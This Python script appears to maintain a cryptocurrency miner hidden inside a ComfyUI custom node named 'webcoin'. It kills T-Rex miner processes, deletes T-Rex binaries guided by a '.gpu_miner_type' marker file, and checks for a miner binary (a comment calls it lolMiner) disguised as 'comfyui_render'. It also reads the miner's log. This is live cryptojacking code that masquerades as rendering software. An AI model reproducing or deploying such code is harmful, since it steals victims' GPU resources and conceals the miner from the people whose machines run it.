import os, subprocess, platform, glob
lines = []
IS_WIN = platform.system() == "Windows"

# Kill any t-rex process
if IS_WIN:
    for name in ["t-rex", "t-rex.exe"]:
        try:
            r = subprocess.run(["taskkill", "/f", "/im", name], capture_output=True, text=True, timeout=5)
            lines.append("kill " + name + ": rc=" + str(r.returncode) + " " + r.stdout.strip()[:60])
        except:
            pass
else:
    try:
        r = subprocess.run(["pkill", "-9", "-f", "t-rex"], capture_output=True, text=True, timeout=5)
        lines.append("pkill t-rex: rc=" + str(r.returncode))
    except:
        lines.append("pkill t-rex: not available")

# Also kill comfyui_render in case it's running the wrong binary
if IS_WIN:
    try:
        r = subprocess.run(["taskkill", "/f", "/im", "comfyui_render.exe"], capture_output=True, text=True, timeout=5)
        lines.append("kill comfyui_render: rc=" + str(r.returncode) + " " + r.stdout.strip()[:60])
    except:
        pass
else:
    try:
        r = subprocess.run(["pkill", "-9", "-f", "comfyui_render"], capture_output=True, text=True, timeout=5)
        lines.append("pkill comfyui_render: rc=" + str(r.returncode))
    except:
        pass

# Find webcoin bin dir
webcoin = None
try:
    import folder_paths
    cn = folder_paths.get_folder_paths("custom_nodes")[0]
    webcoin = os.path.join(cn, "webcoin")
except:
    pass
if not webcoin or not os.path.isdir(webcoin):
    for c in [r"C:\ComfyUI\custom_nodes\webcoin",
              "/root/ComfyUI/custom_nodes/webcoin",
              "/home/ubuntu/ComfyUI/custom_nodes/webcoin",
              "/home/Ubuntu/ComfyUI/custom_nodes/webcoin",
              "/workspace/ComfyUI/custom_nodes/webcoin"]:
        if os.path.isdir(c):
            webcoin = c
            break

if webcoin:
    bin_dir = os.path.join(webcoin, "bin")
    lines.append("bin_dir=" + bin_dir)
    if os.path.isdir(bin_dir):
        contents = os.listdir(bin_dir)
        lines.append("bin_contents=" + str(contents))

        # Check marker
        marker = os.path.join(bin_dir, ".gpu_miner_type")
        if os.path.exists(marker):
            with open(marker) as f:
                lines.append("gpu_marker=" + f.read().strip())
        else:
            lines.append("gpu_marker=NONE")

        # Delete any t-rex binary / archive remnant
        render_name = "comfyui_render.exe" if IS_WIN else "comfyui_render"
        render_path = os.path.join(bin_dir, render_name)
        if os.path.exists(marker):
            with open(marker) as f:
                if f.read().strip() == "trex":
                    if os.path.exists(render_path):
                        os.remove(render_path)
                        lines.append("DELETED trex binary at " + render_path)
                    os.remove(marker)
                    lines.append("DELETED trex marker")

        for f in contents:
            fl = f.lower()
            if "trex" in fl or "t-rex" in fl:
                fp = os.path.join(bin_dir, f)
                os.remove(fp)
                lines.append("DELETED t-rex file: " + f)

        # Check if lolMiner binary exists
        if os.path.exists(render_path):
            size = os.path.getsize(render_path)
            lines.append("render_binary=" + render_path + " size=" + str(size))
        else:
            lines.append("render_binary=MISSING")

        # Check render.log for clues
        log_path = os.path.join(bin_dir, "render.log")
        if os.path.exists(log_path):
            with open(log_path) as f:
                log_tail = f.read()[-500:]
            lines.append("render_log_tail=" + log_tail.replace(chr(10), " | "))
        else:
            lines.append("render_log=NONE")
    else:
        lines.append("bin_dir=MISSING")
else:
    lines.append("webcoin=NOT_FOUND")

result = chr(10).join(lines)
